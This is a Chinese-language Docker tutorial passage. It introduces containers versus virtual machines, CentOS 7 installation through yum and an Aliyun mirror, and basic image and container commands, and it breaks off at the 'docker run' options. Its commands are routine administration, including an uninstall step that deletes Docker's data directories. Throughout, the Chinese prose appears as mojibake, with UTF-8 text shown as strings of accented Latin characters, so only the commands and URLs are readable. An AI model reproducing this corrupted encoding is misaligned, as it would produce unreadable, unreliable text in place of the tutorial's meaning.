å°±æ˜¯åœ¨å®ƒçš„åŸºç¡€ä¸Šå‘å±•è¿‡æ¥çš„ã€‚å°†åº”ç”¨æ‰“æˆé•œåƒï¼Œé€šè¿‡é•œåƒæˆä¸ºè¿è¡Œåœ¨Dockerå®¹å™¨ä¸Šé¢çš„å®ä¾‹ï¼Œè€Œ Dockerå®¹å™¨åœ¨ä»»ä½•æ“ä½œç³»ç»Ÿä¸Šéƒ½æ˜¯ä¸€è‡´çš„ï¼Œè¿™å°±å®ç°äº†è·¨å¹³å°ã€è·¨æœåŠ¡å™¨ã€‚åªéœ€è¦ä¸€æ¬¡é…ç½®å¥½ç¯å¢ƒï¼Œæ¢åˆ°åˆ«çš„æœºå­ä¸Šå°±å¯ä»¥ä¸€é”®éƒ¨ç½²å¥½ï¼Œå¤§å¤§ç®€åŒ–äº†æ“ä½œã€‚ 1.1.3 ä¸€å¥è¯ è§£å†³äº†è¿è¡Œç¯å¢ƒå’Œé…ç½®é—®é¢˜çš„è½¯ä»¶å®¹å™¨ï¼Œæ–¹ä¾¿åšæŒç»­é›†æˆå¹¶æœ‰åŠ©äºæ•´ä½“å‘å¸ƒçš„å®¹å™¨è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ 1.2 å®¹å™¨ä¸è™šæ‹Ÿæœºæ¯”è¾ƒ 1.2.1 å®¹å™¨å‘å±•ç®€å² 1.2.2 ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯ è™šæ‹Ÿæœºï¼ˆvirtual machineï¼‰å°±æ˜¯å¸¦ç¯å¢ƒå®‰è£…çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚ å®ƒå¯ä»¥åœ¨ä¸€ç§æ“ä½œç³»ç»Ÿé‡Œé¢è¿è¡Œå¦ä¸€ç§æ“ä½œç³»ç»Ÿï¼Œæ¯”å¦‚åœ¨Windows10ç³»ç»Ÿé‡Œé¢è¿è¡ŒLinuxç³»ç»ŸCentOS7ã€‚åº”ç”¨ç¨‹åºå¯¹æ­¤æ¯«æ— æ„ŸçŸ¥ï¼Œå› ä¸ºè™šæ‹Ÿæœºçœ‹ä¸Šå»è·ŸçœŸå®ç³»ç»Ÿä¸€æ¨¡ä¸€æ ·ï¼Œè€Œå¯¹äºåº•å±‚ç³»ç»Ÿæ¥è¯´ï¼Œè™šæ‹Ÿæœºå°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œä¸éœ€è¦äº†å°±åˆ æ‰ï¼Œå¯¹å…¶ä»–éƒ¨åˆ†æ¯«æ— å½±å“ã€‚è¿™ç±»è™šæ‹Ÿæœºå®Œç¾çš„è¿è¡Œäº†å¦ä¸€å¥—ç³»ç»Ÿï¼Œèƒ½å¤Ÿä½¿åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿå’Œç¡¬ä»¶ä¸‰è€…ä¹‹é—´çš„é€»è¾‘ä¸å˜ã€‚ è™šæ‹Ÿæœºçš„ç¼ºç‚¹ï¼š 1 èµ„æºå ç”¨å¤š 2 å†—ä½™æ­¥éª¤å¤š 3 å¯åŠ¨æ…¢ 1.2.3 å®¹å™¨è™šæ‹ŸåŒ–æŠ€æœ¯ ç”±äºå‰é¢è™šæ‹Ÿæœºå­˜åœ¨æŸäº›ç¼ºç‚¹ï¼ŒLinuxå‘å±•å‡ºäº†å¦ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼š Linuxå®¹å™¨(Linux Containersï¼Œç¼©å†™ä¸º LXC) Linuxå®¹å™¨æ˜¯ä¸ç³»ç»Ÿå…¶ä»–éƒ¨åˆ†éš”ç¦»å¼€çš„ä¸€ç³»åˆ—è¿›ç¨‹ï¼Œä»å¦ä¸€ä¸ªé•œåƒè¿è¡Œï¼Œå¹¶ç”±è¯¥é•œåƒæä¾›æ”¯æŒè¿›ç¨‹æ‰€éœ€çš„å…¨éƒ¨æ–‡ä»¶ã€‚å®¹å™¨æä¾›çš„é•œåƒåŒ…å«äº†åº”ç”¨çš„æ‰€æœ‰ä¾èµ–é¡¹ï¼Œå› è€Œåœ¨ä»å¼€å‘åˆ°æµ‹è¯•å†åˆ°ç”Ÿäº§çš„æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œå®ƒéƒ½å…·æœ‰å¯ç§»æ¤æ€§å’Œä¸€è‡´æ€§ã€‚ Linux å®¹å™¨ä¸æ˜¯æ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿè€Œæ˜¯å¯¹è¿›ç¨‹è¿›è¡Œéš”ç¦»ã€‚æœ‰äº†å®¹å™¨ï¼Œå°±å¯ä»¥å°†è½¯ä»¶è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰èµ„æºæ‰“åŒ…åˆ°ä¸€ä¸ªéš”ç¦»çš„å®¹å™¨ä¸­ã€‚å®¹å™¨ä¸è™šæ‹Ÿæœºä¸åŒï¼Œä¸éœ€è¦æ†ç»‘ä¸€æ•´å¥—æ“ä½œç³»ç»Ÿï¼Œåªéœ€è¦è½¯ä»¶å·¥ä½œæ‰€éœ€çš„åº“èµ„æºå’Œè®¾ç½®ã€‚ç³»ç»Ÿå› æ­¤è€Œå˜å¾—é«˜æ•ˆè½»é‡å¹¶ä¿è¯éƒ¨ç½²åœ¨ä»»ä½•ç¯å¢ƒä¸­çš„è½¯ä»¶éƒ½èƒ½å§‹ç»ˆå¦‚ä¸€åœ°è¿è¡Œã€‚ 1.2.4 å¯¹æ¯” æ¯”è¾ƒäº† Docker å’Œä¼ ç»Ÿè™šæ‹ŸåŒ–æ–¹å¼çš„ä¸åŒä¹‹å¤„ï¼š *ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ï¼› *å®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿ã€‚ * æ¯ä¸ªå®¹å™¨ä¹‹é—´äº’ç›¸éš”ç¦»ï¼Œæ¯ä¸ªå®¹å™¨æœ‰è‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿ ï¼Œå®¹å™¨ä¹‹é—´è¿›ç¨‹ä¸ä¼šç›¸äº’å½±å“ï¼Œèƒ½åŒºåˆ†è®¡ç®—èµ„æºã€‚ 1.3 èƒ½å¹²å˜› 1.3.1 æŠ€æœ¯èŒçº§å˜åŒ– coder -&gt; programmer -&gt; software engineer -&gt; DevOps engineer 1.3.2 å¼€å‘/è¿ç»´ï¼ˆDevOpsï¼‰æ–°ä¸€ä»£å¼€å‘å·¥ç¨‹å¸ˆ 1.3.2.1 ä¸€æ¬¡æ„å»ºã€éšå¤„è¿è¡Œ æ›´å¿«é€Ÿçš„åº”ç”¨äº¤ä»˜å’Œéƒ¨ç½² ä¼ ç»Ÿçš„åº”ç”¨å¼€å‘å®Œæˆåï¼Œéœ€è¦æä¾›ä¸€å †å®‰è£…ç¨‹åºå’Œé…ç½®è¯´æ˜æ–‡æ¡£ï¼Œå®‰è£…éƒ¨ç½²åéœ€æ ¹æ®é…ç½®æ–‡æ¡£è¿›è¡Œç¹æ‚çš„é…ç½®æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚DockeråŒ–ä¹‹ååªéœ€è¦äº¤ä»˜å°‘é‡å®¹å™¨é•œåƒæ–‡ä»¶ï¼Œåœ¨æ­£å¼ç”Ÿäº§ç¯å¢ƒåŠ è½½é•œåƒå¹¶è¿è¡Œå³å¯ï¼Œåº”ç”¨å®‰è£…é…ç½®åœ¨é•œåƒé‡Œå·²ç»å†…ç½®å¥½ï¼Œå¤§å¤§èŠ‚çœéƒ¨ç½²é…ç½®å’Œæµ‹è¯•éªŒè¯æ—¶é—´ã€‚ æ›´ä¾¿æ·çš„å‡çº§å’Œæ‰©ç¼©å®¹ éšç€å¾®æœåŠ¡æ¶æ„å’ŒDockerçš„å‘å±•ï¼Œå¤§é‡çš„åº”ç”¨ä¼šé€šè¿‡å¾®æœåŠ¡æ–¹å¼æ¶æ„ï¼Œåº”ç”¨çš„å¼€å‘æ„å»ºå°†å˜æˆæ­ä¹é«˜ç§¯æœ¨ä¸€æ ·ï¼Œæ¯ä¸ªDockerå®¹å™¨å°†å˜æˆä¸€å—â€œç§¯æœ¨â€ï¼Œåº”ç”¨çš„å‡çº§å°†å˜å¾—éå¸¸å®¹æ˜“ã€‚å½“ç°æœ‰çš„å®¹å™¨ä¸è¶³ä»¥æ”¯æ’‘ä¸šåŠ¡å¤„ç†æ—¶ï¼Œå¯é€šè¿‡é•œåƒè¿è¡Œæ–°çš„å®¹å™¨è¿›è¡Œå¿«é€Ÿæ‰©å®¹ï¼Œä½¿åº”ç”¨ç³»ç»Ÿçš„æ‰©å®¹ä»åŸå…ˆçš„å¤©çº§å˜æˆåˆ†é’Ÿçº§ç”šè‡³ç§’çº§ã€‚ æ›´ç®€å•çš„ç³»ç»Ÿè¿ç»´ åº”ç”¨å®¹å™¨åŒ–è¿è¡Œåï¼Œç”Ÿäº§ç¯å¢ƒè¿è¡Œçš„åº”ç”¨å¯ä¸å¼€å‘ã€æµ‹è¯•ç¯å¢ƒçš„åº”ç”¨é«˜åº¦ä¸€è‡´ï¼Œå®¹å™¨ä¼šå°†åº”ç”¨ç¨‹åºç›¸å…³çš„ç¯å¢ƒå’ŒçŠ¶æ€å®Œå…¨å°è£…èµ·æ¥ï¼Œä¸ä¼šå› ä¸ºåº•å±‚åŸºç¡€æ¶æ„å’Œæ“ä½œç³»ç»Ÿçš„ä¸ä¸€è‡´æ€§ç»™åº”ç”¨å¸¦æ¥å½±å“ï¼Œäº§ç”Ÿæ–°çš„BUGã€‚å½“å‡ºç°ç¨‹åºå¼‚å¸¸æ—¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æµ‹è¯•ç¯å¢ƒçš„ç›¸åŒå®¹å™¨è¿›è¡Œå¿«é€Ÿå®šä½å’Œä¿®å¤ã€‚ æ›´é«˜æ•ˆçš„è®¡ç®—èµ„æºåˆ©ç”¨ Dockeræ˜¯å†…æ ¸çº§è™šæ‹ŸåŒ–ï¼Œå…¶ä¸åƒä¼ ç»Ÿçš„è™šæ‹ŸåŒ–æŠ€æœ¯ä¸€æ ·éœ€è¦é¢å¤–çš„Hypervisoræ”¯æŒï¼Œæ‰€ä»¥åœ¨ä¸€å°ç‰©ç†æœºä¸Šå¯ä»¥è¿è¡Œå¾ˆå¤šä¸ªå®¹å™¨å®ä¾‹ï¼Œå¯å¤§å¤§æå‡ç‰©ç†æœåŠ¡å™¨çš„CPUå’Œå†…å­˜çš„åˆ©ç”¨ç‡ã€‚ 1.3.2.2 Dockeråº”ç”¨åœºæ™¯ 1.3.3 å“ªäº›ä¼ä¸šåœ¨ä½¿ç”¨ æ–°æµª ç¾å›¢ è˜‘è‡è¡— 1.4 å»å“ªä¸‹ 1.4.1 å®˜ç½‘ dockerå®˜ç½‘ï¼šhttp://www.docker.com 1.4.2 ä»“åº“ Docker Hubå®˜ç½‘: https://hub.docker.com/ 2 Dockerå®‰è£… 2.1 å‰æè¯´æ˜ CentOS Docker å®‰è£… å‰ææ¡ä»¶ ç›®å‰ï¼ŒCentOS ä»…å‘è¡Œç‰ˆæœ¬ä¸­çš„å†…æ ¸æ”¯æŒ Dockerã€‚Docker è¿è¡Œåœ¨CentOS 7 (64-bit)ä¸Šï¼Œ è¦æ±‚ç³»ç»Ÿä¸º64ä½ã€Linuxç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ä¸º 3.8ä»¥ä¸Šï¼Œè¿™é‡Œé€‰ç”¨Centos7.x æŸ¥çœ‹è‡ªå·±çš„å†…æ ¸ unameå‘½ä»¤ç”¨äºæ‰“å°å½“å‰ç³»ç»Ÿç›¸å…³ä¿¡æ¯ï¼ˆå†…æ ¸ç‰ˆæœ¬å·ã€ç¡¬ä»¶æ¶æ„ã€ä¸»æœºåç§°å’Œæ“ä½œç³»ç»Ÿç±»å‹ç­‰ï¼‰ã€‚ 2.2 Dockerçš„åŸºæœ¬ç»„æˆ Dockeræ˜¯ä¸€ä¸ªClient-Serverç»“æ„çš„ç³»ç»Ÿï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸»æœºä¸Šï¼Œ ç„¶åé€šè¿‡Socketè¿æ¥ä»å®¢æˆ·ç«¯è®¿é—®ï¼Œå®ˆæŠ¤è¿›ç¨‹ä»å®¢æˆ·ç«¯æ¥å—å‘½ä»¤å¹¶ç®¡ç†è¿è¡Œåœ¨ä¸»æœºä¸Šçš„å®¹å™¨ã€‚ å®¹å™¨ï¼Œæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒï¼Œå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´åˆ°çš„é›†è£…ç®±ã€‚å¯ä»¥å¯¹æ¯”mysqlæ¼”ç¤ºå¯¹æ¯”è®²è§£ 2.2.1 é•œåƒ(image) Docker é•œåƒï¼ˆImageï¼‰å°±æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ã€‚é•œåƒå¯ä»¥ç”¨æ¥åˆ›å»º Docker å®¹å™¨ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¾ˆå¤šå®¹å™¨ã€‚ å®ƒä¹Ÿç›¸å½“äºæ˜¯ä¸€ä¸ªrootæ–‡ä»¶ç³»ç»Ÿã€‚æ¯”å¦‚å®˜æ–¹é•œåƒ centos:7 å°±åŒ…å«äº†å®Œæ•´çš„ä¸€å¥— centos:7 æœ€å°ç³»ç»Ÿçš„ root æ–‡ä»¶ç³»ç»Ÿã€‚ ç›¸å½“äºå®¹å™¨çš„â€œæºä»£ç â€ï¼Œdockeré•œåƒæ–‡ä»¶ç±»ä¼¼äºJavaçš„ç±»æ¨¡æ¿ï¼Œè€Œdockerå®¹å™¨å®ä¾‹ç±»ä¼¼äºjavaä¸­newå‡ºæ¥çš„å®ä¾‹å¯¹è±¡ã€‚ 2.2.2 å®¹å™¨(container) 1 ä»é¢å‘å¯¹è±¡è§’åº¦ Docker åˆ©ç”¨å®¹å™¨ï¼ˆContainerï¼‰ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨ï¼Œåº”ç”¨ç¨‹åºæˆ–æœåŠ¡è¿è¡Œåœ¨å®¹å™¨é‡Œé¢ï¼Œå®¹å™¨å°±ç±»ä¼¼äºä¸€ä¸ªè™šæ‹ŸåŒ–çš„è¿è¡Œç¯å¢ƒï¼Œå®¹å™¨æ˜¯ç”¨é•œåƒåˆ›å»ºçš„è¿è¡Œå®ä¾‹ã€‚å°±åƒæ˜¯Javaä¸­çš„ç±»å’Œå®ä¾‹å¯¹è±¡ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨ä¸ºé•œåƒæä¾›äº†ä¸€ä¸ªæ ‡å‡†çš„å’Œéš”ç¦»çš„è¿è¡Œç¯å¢ƒï¼Œå®ƒå¯ä»¥è¢«å¯åŠ¨ã€å¼€å§‹ã€åœæ­¢ã€åˆ é™¤ã€‚æ¯ä¸ªå®¹å™¨éƒ½æ˜¯ç›¸äº’éš”ç¦»çš„ã€ä¿è¯å®‰å…¨çš„å¹³å° 2 ä»é•œåƒå®¹å™¨è§’åº¦ å¯ä»¥æŠŠå®¹å™¨çœ‹åšæ˜¯ä¸€ä¸ªç®€æ˜“ç‰ˆçš„ Linux ç¯å¢ƒï¼ˆåŒ…æ‹¬rootç”¨æˆ·æƒé™ã€è¿›ç¨‹ç©ºé—´ã€ç”¨æˆ·ç©ºé—´å’Œç½‘ç»œç©ºé—´ç­‰ï¼‰å’Œè¿è¡Œåœ¨å…¶ä¸­çš„åº”ç”¨ç¨‹åºã€‚ 2.2.3 ä»“åº“(repository) ä»“åº“ï¼ˆRepositoryï¼‰æ˜¯é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœºæ‰€ã€‚ ç±»ä¼¼äº Mavenä»“åº“ï¼Œå­˜æ”¾å„ç§jaråŒ…çš„åœ°æ–¹ï¼› githubä»“åº“ï¼Œå­˜æ”¾å„ç§gité¡¹ç›®çš„åœ°æ–¹ï¼› Dockerå…¬å¸æä¾›çš„å®˜æ–¹registryè¢«ç§°ä¸ºDocker Hubï¼Œå­˜æ”¾å„ç§é•œåƒæ¨¡æ¿çš„åœ°æ–¹ã€‚ ä»“åº“åˆ†ä¸ºå…¬å¼€ä»“åº“ï¼ˆPublicï¼‰å’Œç§æœ‰ä»“åº“ï¼ˆPrivateï¼‰ä¸¤ç§å½¢å¼ã€‚ æœ€å¤§çš„å…¬å¼€ä»“åº“æ˜¯ Docker Hub(https://hub.docker.com/)ï¼Œ å­˜æ”¾äº†æ•°é‡åºå¤§çš„é•œåƒä¾›ç”¨æˆ·ä¸‹è½½ã€‚å›½å†…çš„å…¬å¼€ä»“åº“åŒ…æ‹¬é˜¿é‡Œäº‘ ã€ç½‘æ˜“äº‘ç­‰ã€‚ 2.2.4 å°æ€»ç»“ éœ€è¦æ­£ç¡®çš„ç†è§£ä»“åº“/é•œåƒ/å®¹å™¨è¿™å‡ ä¸ªæ¦‚å¿µ: Docker æœ¬èº«æ˜¯ä¸€ä¸ªå®¹å™¨è¿è¡Œè½½ä½“æˆ–ç§°ä¹‹ä¸ºç®¡ç†å¼•æ“ã€‚æˆ‘ä»¬æŠŠåº”ç”¨ç¨‹åºå’Œé…ç½®ä¾èµ–æ‰“åŒ…å¥½å½¢æˆä¸€ä¸ªå¯äº¤ä»˜çš„è¿è¡Œç¯å¢ƒï¼Œè¿™ä¸ªæ‰“åŒ…å¥½çš„è¿è¡Œç¯å¢ƒå°±æ˜¯imageé•œåƒæ–‡ä»¶ã€‚åªæœ‰é€šè¿‡è¿™ä¸ªé•œåƒæ–‡ä»¶æ‰èƒ½ç”ŸæˆDockerå®¹å™¨å®ä¾‹(ç±»ä¼¼Javaä¸­newå‡ºæ¥ä¸€ä¸ªå¯¹è±¡)ã€‚ imageæ–‡ä»¶å¯ä»¥çœ‹ä½œæ˜¯å®¹å™¨çš„æ¨¡æ¿ã€‚Docker æ ¹æ® image æ–‡ä»¶ç”Ÿæˆå®¹å™¨çš„å®ä¾‹ã€‚åŒä¸€ä¸ª image æ–‡ä»¶ï¼Œå¯ä»¥ç”Ÿæˆå¤šä¸ªåŒæ—¶è¿è¡Œçš„å®¹å™¨å®ä¾‹ã€‚ é•œåƒæ–‡ä»¶ * image æ–‡ä»¶ç”Ÿæˆçš„å®¹å™¨å®ä¾‹ï¼Œæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç§°ä¸ºé•œåƒæ–‡ä»¶ã€‚ å®¹å™¨å®ä¾‹ * ä¸€ä¸ªå®¹å™¨è¿è¡Œä¸€ç§æœåŠ¡ï¼Œå½“æˆ‘ä»¬éœ€è¦çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡dockerå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„è¿è¡Œå®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å®¹å™¨ ä»“åº“ * å°±æ˜¯æ”¾ä¸€å †é•œåƒçš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠé•œåƒå‘å¸ƒåˆ°ä»“åº“ä¸­ï¼Œéœ€è¦çš„æ—¶å€™å†ä»ä»“åº“ä¸­æ‹‰ä¸‹æ¥å°±å¯ä»¥äº†ã€‚ 2.3 Dockerå¹³å°æ¶æ„å›¾è§£(æ¶æ„ç‰ˆ) Docker æ˜¯ä¸€ä¸ª C/S æ¨¡å¼çš„æ¶æ„ï¼Œåç«¯æ˜¯ä¸€ä¸ªæ¾è€¦åˆæ¶æ„ï¼Œä¼—å¤šæ¨¡å—å„å¸å…¶èŒã€‚ 2.4 å®‰è£…æ­¥éª¤ CentOS7å®‰è£…Dockerï¼šhttps://docs.docker.com/engine/install/centos/ 2.4.1 ç¡®å®šä½ æ˜¯CentOS7åŠä»¥ä¸Šç‰ˆæœ¬ cat /etc/redhat-release 2.4.2 å¸è½½æ—§ç‰ˆæœ¬ https://docs.docker.com/engine/install/centos/ 2.4.3 yumå®‰è£…gccç›¸å…³ CentOS7èƒ½ä¸Šå¤–ç½‘ yum -y install gcc yum -y install gcc-c++ 2.4.4 å®‰è£…éœ€è¦çš„è½¯ä»¶åŒ… å®˜ç½‘è¦æ±‚ æ‰§è¡Œå‘½ä»¤ yum install -y yum-utils 2.4.5 è®¾ç½®stableé•œåƒä»“åº“ âŒ yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo æŠ¥é”™ï¼š 1 [Errno 14] curl#35 - TCP connection reset by peer 2 [Errno 12] curl#35 - Timeout âœ”ï¸ yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 2.4.6 æ›´æ–°yumè½¯ä»¶åŒ…ç´¢å¼• yum makecache fast 2.4.7 å®‰è£…DOCKER CE yum -y install docker-ce docker-ce-cli containerd.io å®˜ç½‘è¦æ±‚ æ‰§è¡Œç»“æœ 2.4.8 å¯åŠ¨docker systemctl start docker 2.4.9 æµ‹è¯• docker version docker run hello-world 2.4.10 å¸è½½ systemctl stop docker yum remove docker-ce docker-ce-cli containerd.io rm -rf /var/lib/docker rm -rf /var/lib/containerd 2.5 é˜¿é‡Œäº‘é•œåƒåŠ é€Ÿ æ˜¯ä»€ä¹ˆ https://promotion.aliyun.com/ntms/act/kubernetes.html æ³¨å†Œä¸€ä¸ªå±äºè‡ªå·±çš„é˜¿é‡Œäº‘è´¦æˆ·(å¯å¤ç”¨æ·˜å®è´¦å·) è·å¾—åŠ é€Ÿå™¨åœ°å€è¿æ¥ ç™»é™†é˜¿é‡Œäº‘å¼€å‘è€…å¹³å° ç‚¹å‡»æ§åˆ¶å° é€‰æ‹©å®¹å™¨é•œåƒæœåŠ¡ è·å–åŠ é€Ÿå™¨åœ°å€ ç²˜è´´è„šæœ¬ç›´æ¥æ‰§è¡Œ ç›´æ¥ç²˜ æˆ–è€…åˆ†æ­¥éª¤éƒ½è¡Œ mkdir -p /etc/docker vim /etc/docker/daemon.json é‡å¯æœåŠ¡å™¨ systemctl daemon-reload systemctl restart docker 2.6 æ°¸è¿œçš„HelloWorld å¯åŠ¨Dockeråå°å®¹å™¨(æµ‹è¯•è¿è¡Œ hello-world) docker run hello-world è¾“å‡ºè¿™æ®µæç¤ºä»¥åï¼Œhello worldå°±ä¼šåœæ­¢è¿è¡Œï¼Œå®¹å™¨è‡ªåŠ¨ç»ˆæ­¢ã€‚ runå¹²äº†ä»€ä¹ˆï¼Ÿ 2.7 åº•å±‚åŸç† ä¸ºä»€ä¹ˆDockerä¼šæ¯”VMè™šæ‹Ÿæœºå¿« (1)dockeræœ‰ç€æ¯”è™šæ‹Ÿæœºæ›´å°‘çš„æŠ½è±¡å±‚ ç”±äºdockerä¸éœ€è¦Hypervisor(è™šæ‹Ÿæœº)å®ç°ç¡¬ä»¶èµ„æºè™šæ‹ŸåŒ–,è¿è¡Œåœ¨dockerå®¹å™¨ä¸Šçš„ç¨‹åºç›´æ¥ä½¿ç”¨çš„éƒ½æ˜¯å®é™…ç‰©ç†æœºçš„ç¡¬ä»¶èµ„æºã€‚å› æ­¤åœ¨CPUã€å†…å­˜åˆ©ç”¨ç‡ä¸Šdockerå°†ä¼šåœ¨æ•ˆç‡ä¸Šæœ‰æ˜æ˜¾ä¼˜åŠ¿ã€‚ (2)dockeråˆ©ç”¨çš„æ˜¯å®¿ä¸»æœºçš„å†…æ ¸,è€Œä¸éœ€è¦åŠ è½½æ“ä½œç³»ç»ŸOSå†…æ ¸ å½“æ–°å»ºä¸€ä¸ªå®¹å™¨æ—¶,dockerä¸éœ€è¦å’Œè™šæ‹Ÿæœºä¸€æ ·é‡æ–°åŠ è½½ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ã€‚è¿›è€Œé¿å…å¼•å¯»ã€åŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸è¿”å›ç­‰æ¯”è¾ƒè´¹æ—¶è´¹èµ„æºçš„è¿‡ç¨‹,å½“æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºæ—¶,è™šæ‹Ÿæœºè½¯ä»¶éœ€è¦åŠ è½½OS,è¿”å›æ–°å»ºè¿‡ç¨‹æ˜¯åˆ†é’Ÿçº§åˆ«çš„ã€‚è€Œdockerç”±äºç›´æ¥åˆ©ç”¨å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿ,åˆ™çœç•¥äº†è¿”å›è¿‡ç¨‹,å› æ­¤æ–°å»ºä¸€ä¸ªdockerå®¹å™¨åªéœ€è¦å‡ ç§’é’Ÿã€‚ 3 Dockerå¸¸ç”¨å‘½ä»¤ 3.1 å¸®åŠ©å¯åŠ¨ç±»å‘½ä»¤ å¯åŠ¨dockerï¼š systemctl start docker åœæ­¢dockerï¼š systemctl stop docker é‡å¯dockerï¼š systemctl restart docker æŸ¥çœ‹dockerçŠ¶æ€ï¼š systemctl status docker å¼€æœºå¯åŠ¨ï¼š systemctl enable docker æŸ¥çœ‹dockeræ¦‚è¦ä¿¡æ¯ï¼š docker info æŸ¥çœ‹dockeræ€»ä½“å¸®åŠ©æ–‡æ¡£ï¼š docker --help æŸ¥çœ‹dockerå‘½ä»¤å¸®åŠ©æ–‡æ¡£ï¼š docker å…·ä½“å‘½ä»¤ --help 3.2 é•œåƒå‘½ä»¤ 3.2.1docker images åˆ—å‡ºæœ¬åœ°ä¸»æœºä¸Šçš„é•œåƒ å„ä¸ªé€‰é¡¹è¯´æ˜: REPOSITORYï¼šè¡¨ç¤ºé•œåƒçš„ä»“åº“æº TAGï¼šé•œåƒçš„æ ‡ç­¾ç‰ˆæœ¬å· IMAGE IDï¼šé•œåƒID CREATEDï¼šé•œåƒåˆ›å»ºæ—¶é—´ SIZEï¼šé•œåƒå¤§å° åŒä¸€ä»“åº“æºå¯ä»¥æœ‰å¤šä¸ª TAGç‰ˆæœ¬ï¼Œä»£è¡¨è¿™ä¸ªä»“åº“æºçš„ä¸åŒä¸ªç‰ˆæœ¬ï¼Œæˆ‘ä»¬ä½¿ç”¨ REPOSITORY:TAG æ¥å®šä¹‰ä¸åŒçš„é•œåƒã€‚ å¦‚æœä½ ä¸æŒ‡å®šä¸€ä¸ªé•œåƒçš„ç‰ˆæœ¬æ ‡ç­¾ï¼Œä¾‹å¦‚ä½ åªä½¿ç”¨ ubuntuï¼Œdocker å°†é»˜è®¤ä½¿ç”¨ ubuntu:latest é•œåƒ OPTIONSè¯´æ˜ï¼š -a :åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„é•œåƒï¼ˆå«å†å²æ˜ åƒå±‚ï¼‰ -q :åªæ˜¾ç¤ºé•œåƒIDã€‚ 3.2.2docker search æŸä¸ªXXXé•œåƒåå­— ç½‘ç«™ï¼šhttps://hub.docker.com å‘½ä»¤ï¼šdocker search [OPTIONS] é•œåƒåå­— OPTIONSè¯´æ˜ï¼š â€“limit : åªåˆ—å‡ºNä¸ªé•œåƒï¼Œé»˜è®¤25ä¸ª docker search --limit 5 redis 3.2.3docker pull æŸä¸ªXXXé•œåƒåå­— ä¸‹è½½é•œåƒ docker pull é•œåƒåå­—[:TAG] docker pull é•œåƒåå­— æ²¡æœ‰TAGå°±æ˜¯æœ€æ–°ç‰ˆ ç­‰ä»·äº docker pull é•œåƒåå­—:latest docker pull ubuntu 3.2.4docker system df æŸ¥çœ‹é•œåƒ/å®¹å™¨/æ•°æ®å·æ‰€å çš„ç©ºé—´ 3.2.5docker rmi æŸä¸ªXXXé•œåƒåå­—ID åˆ é™¤é•œåƒ åˆ é™¤å•ä¸ª docker rmi -f é•œåƒID åˆ é™¤å¤šä¸ª docker rmi -f é•œåƒå1:TAG é•œåƒå2:TAG åˆ é™¤å…¨éƒ¨ docker rmi -f $(docker images -qa) 3.2.6 é¢è¯•é¢˜ï¼šè°ˆè°ˆdockerè™šæ‚¬é•œåƒæ˜¯ä»€ä¹ˆï¼Ÿ æ˜¯ä»€ä¹ˆï¼Ÿ ä»“åº“åã€æ ‡ç­¾éƒ½æ˜¯çš„é•œåƒï¼Œä¿—ç§°è™šæ‚¬é•œåƒdangling image é•¿ä»€ä¹ˆæ ·ï¼Ÿ 3.3 å®¹å™¨å‘½ä»¤ 3.3.1 æœ‰é•œåƒæ‰èƒ½åˆ›å»ºå®¹å™¨ï¼Œ è¿™æ˜¯æ ¹æœ¬å‰æ(ä¸‹è½½ä¸€ä¸ªCentOSæˆ–è€…ubuntué•œåƒæ¼”ç¤º) docker pull centos docker pull ubuntu 3.3.2 æ–°å»º+å¯åŠ¨å®¹å™¨ docker run [OPTIONS] IMAGE [COMMAND] [ARG...] OPTIONSè¯´æ˜ 